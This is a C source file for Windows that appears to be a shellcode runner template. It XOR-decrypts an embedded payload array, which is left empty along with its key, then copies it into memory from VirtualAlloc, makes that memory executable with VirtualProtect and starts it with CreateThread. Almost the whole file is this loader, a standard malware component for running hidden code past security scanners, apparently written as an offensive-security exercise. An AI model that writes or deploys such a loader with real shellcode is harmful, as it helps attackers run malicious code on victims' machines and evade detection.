#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void XOR(char* source, size_t source_len, char* key, size_t key_len) {
    int j = 0;

    for (int i = 0; i < source_len; ++i) {
        if(j == key_len - 1) {
            j = 0;
        }

        source[i] = source[i] ^ key[j]; 
        ++j;
    }
}

int main(void) {
    unsigned char payload[] = 
    {
       // :) 
    };
    
    unsigned int payload_len = sizeof(payload);
    BOOL rv = false; // return value
    // Note: PVOID and LPVOID are the same 
    LPVOID payload_exec;    
    DWORD oldprotect = 0;
    HANDLE hThread;
    char key[] = "";
    unsigned int key_len = sizeof(key);

    // Allocate memory
    // https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
    payload_exec = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    printf("%s: 0x%p\n", "payload address", (PVOID)payload);
    printf("%s: 0x%p\n", "payload_exec", (PVOID)payload_exec);
    printf("[+] Press <enter> to continue: \n");
    getchar();

    // Decrypt the payload
    XOR((char*)payload, payload_len, key, key_len);

    // Copy payload to allocated memory
    // https://learn.microsoft.com/en-us/windows/win32/devnotes/rtlmovememory
    RtlMoveMemory(payload_exec, payload, payload_len); 

    // Change memory permissions
    rv = VirtualProtect(payload_exec, payload_len, PAGE_EXECUTE_READ, &oldprotect);
    if(!rv) {
        // https://learn.microsoft.com/en-us/windows/win32/api/errhandlingapi/nf-errhandlingapi-getlasterror
        printf("[!] Error in using VirtualProtect: %d", GetLastError());
    }

    // CreateThread that to execute memory region, 
    // Wait for process to complete before continuing to next instruction
    if(rv != 0) {
        // https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread
        hThread = CreateThread(0, 0,(LPTHREAD_START_ROUTINE) payload_exec, 0, 0, 0);
        // https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject
        WaitForSingleObject(hThread, INFINITE);
    }
    getchar();
    return EXIT_SUCCESS;
}
